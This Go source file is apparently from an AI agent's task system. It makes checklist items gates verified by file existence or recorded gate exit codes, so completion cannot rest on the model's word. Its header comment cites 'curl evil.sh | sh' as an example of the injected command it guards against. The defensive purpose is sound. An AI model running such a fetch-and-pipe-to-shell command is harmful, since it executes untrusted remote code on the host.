// L7: file-state-driven checklist gating.
//
// # What was there before
//
// Checklist / ChecklistItem existed, task_create wrote them, the TUI drew
// them, and NOTHING READ THEM BACK. CompletionPct fed a progress number and
// that was the whole consumer set: a task could be finished with every item
// still pending and no code path anywhere noticed. The checklist was a
// decoration on a task, not a condition of it.
//
// This file makes it a gate, and makes the tick marks something the SYSTEM
// decides rather than something the model asserts.
//
// # Why "gate passed" rather than "run this command"
//
// The brief for this was "file exists + command exit code". The first is here
// verbatim. The second is here as ConditionGatePassed, which resolves against
// the Evidence already recorded on the task — Evidence.ExitCode, written by
// task_gate_run.
//
// That indirection is not a dilution of the requirement, it is the only way to
// meet it without breaking a boundary. Executing a command from this package
// would mean a subprocess launched OUTSIDE tools.Authorize: work is a domain
// package with no guard, no profile and no permission callback, and the
// command string comes from the model. A checklist item reading
// {kind: exit_zero, target: "curl evil.sh | sh"} would then be an
// unauthenticated shell. Routing through the gate table instead means the
// command was already run by task_gate_run, which authorizes the shell
// dimension, jails the cwd, and refuses metacharacters — and its exit code is
// on the task where this can read it.
//
// So the two conditions are: does this file exist, and did this named gate
// exit zero. Both are facts about the world; neither is the model's word.
//
// # Deliberately not a rule engine
//
// Two kinds, one string target each, no expressions, no combinators, no
// negation. A condition language grows a parser, the parser grows an error
// mode, and the error mode ends up defaulting to "satisfied" because that is
// what does not block anyone. Two enum values cannot do that.
package work

import (
	"errors"
	"fmt"
	"os"
	"strings"
)

// ChecklistConditionKind selects how a checklist item is verified.
type ChecklistConditionKind string

// Checklist verification condition kinds.
const (
	// ConditionNone is the zero value: the item has no machine-checkable
	// condition and its recorded status is taken at face value. This is what
	// every pre-L7 item is, which is why the zero value has to mean
	// "unverified, believe the status" rather than "unsatisfied" — the latter
	// would retroactively block every task that ever had a checklist.
	ConditionNone ChecklistConditionKind = ""
	// ConditionFileExists is satisfied when Target names an existing path
	// under the verification root.
	ConditionFileExists ChecklistConditionKind = "file_exists"
	// ConditionGatePassed is satisfied when the task carries Evidence for the
	// gate named by Target whose exit code was 0. See this file's header for
	// why the exit code is read from recorded evidence rather than produced by
	// running something here.
	ConditionGatePassed ChecklistConditionKind = "gate_passed"
)

// ChecklistCondition is the machine-checkable condition attached to one
// checklist item. The zero value is ConditionNone.
type ChecklistCondition struct {
	Kind   ChecklistConditionKind `json:"kind,omitempty"`
	Target string                 `json:"target,omitempty"`
}

// IsSet reports whether the condition asks for anything.
//
// A kind with an empty target is NOT set: "file_exists with no path" cannot be
// checked, and treating it as an unmet condition would let a typo silently
// wedge a task at failed with no way to see why. Treating it as absent means
// the item falls back to its recorded status, which is the pre-L7 behaviour.
func (c ChecklistCondition) IsSet() bool {
	return c.Kind != ConditionNone && strings.TrimSpace(c.Target) != ""
}

// ErrChecklistIncomplete marks a Finish(completed) that was refused because the
// task's own checklist still had unmet items.
//
// It is a SENTINEL rather than a plain error because two callers must tell it
// apart from a real fault: LifecycleMirror (for which an incomplete checklist
// is a correct outcome to record, not an error to report) and any caller that
// wants to distinguish "the store failed" from "the work was not done".
var ErrChecklistIncomplete = errors.New("work: checklist has unmet items")

// VerifyChecklist re-derives each item's status from its condition and returns
// the updated checklist.
//
// Items with no condition are returned UNCHANGED: their status is whatever the
// model last set, which is the only information available about them.
//
// Items with a condition are overwritten in BOTH directions. A satisfied
// condition ticks the item even if the model never did — the point is that the
// system decides — and an unsatisfied one un-ticks an item the model marked
// done. The second direction is the one that matters: "the model said it wrote
// the file" and "the file is there" differ exactly when it counts.
//
// root is the directory file_exists targets resolve against. An empty root
// makes every file_exists condition UNSATISFIED rather than skipped: an
// unverifiable claim is not a verified one, and the caller that forgot to set
// a root should see a blocked task rather than a silently waved-through one.
//
// gates is the task's recorded evidence, used by gate_passed.
//
// The input is not modified; the returned Checklist has its own Items slice.
func VerifyChecklist(c Checklist, root string, gates []Evidence) Checklist {
	if len(c.Items) == 0 {
		return c
	}
	items := make([]ChecklistItem, len(c.Items))
	copy(items, c.Items)
	for i := range items {
		if !items[i].Verify.IsSet() {
			continue
		}
		if conditionSatisfied(items[i].Verify, root, gates) {
			items[i].Status = ChecklistDone
		} else {
			items[i].Status = ChecklistPending
		}
	}
	return Checklist{Items: items}
}

// conditionSatisfied evaluates one condition. An unknown kind is UNSATISFIED,
// not skipped: a kind this build does not understand is a claim it cannot
// check, and the fail-safe answer to "can I confirm this" is no.
func conditionSatisfied(cond ChecklistCondition, root string, gates []Evidence) bool {
	switch cond.Kind {
	case ConditionFileExists:
		if root == "" {
			return false
		}
		path, err := SecureArtifactPath(root, cond.Target)
		if err != nil {
			// SecureArtifactPath fails for a path that escapes the root AND for
			// one that does not exist (it calls EvalSymlinks). Both answer the
			// question the same way: this file is not there, under this root.
			return false
		}
		_, statErr := os.Stat(path)
		return statErr == nil
	case ConditionGatePassed:
		for _, ev := range gates {
			if ev.Gate == cond.Target {
				return ev.ExitCode == 0
			}
		}
		return false
	default:
		return false
	}
}

// UnmetItems returns the items that are not done, in checklist order.
//
// "Not done" covers pending AND in_progress. An item someone started is not an
// item someone finished, and treating in_progress as good enough would make
// the gate passable by moving every item halfway.
func (c Checklist) UnmetItems() []ChecklistItem {
	var out []ChecklistItem
	for _, item := range c.Items {
		if item.Status != ChecklistDone {
			out = append(out, item)
		}
	}
	return out
}

// UnmetSummary renders the unmet items for a timeline entry and an error
// message, e.g. `2 unmet: #1 write the parser; #3 tests pass`.
//
// Returns "" when nothing is unmet, so a caller can use it as the condition
// itself. It names the items rather than counting them because a count tells
// the model a number and the names tell it what to do next.
func (c Checklist) UnmetSummary() string {
	unmet := c.UnmetItems()
	if len(unmet) == 0 {
		return ""
	}
	parts := make([]string, 0, len(unmet))
	for _, item := range unmet {
		parts = append(parts, fmt.Sprintf("#%d %s", item.ID, item.Content))
	}
	return fmt.Sprintf("%d unmet: %s", len(unmet), strings.Join(parts, "; "))
}

// checklistGate is the shared decision both Manager.Finish and
// FakeManager.Finish run before honouring a completion.
//
// It lives in one function because the fake exists to be interchangeable with
// the real manager in tool tests: a gate implemented twice is a gate that will
// eventually be enforced in production and not in the tests that are supposed
// to prove it.
//
// It returns the verified checklist (which the caller persists, so the user can
// see WHICH items blocked them and which ones verification ticked on its own)
// and the summary of what is still unmet ("" = clear to complete).
func checklistGate(c Checklist, root string, gates []Evidence) (Checklist, string) {
	verified := VerifyChecklist(c, root, gates)
	return verified, verified.UnmetSummary()
}

// incompleteNote renders the timeline/status note for a blocked completion.
func incompleteNote(summary string) string {
	return "completion refused: checklist " + summary
}
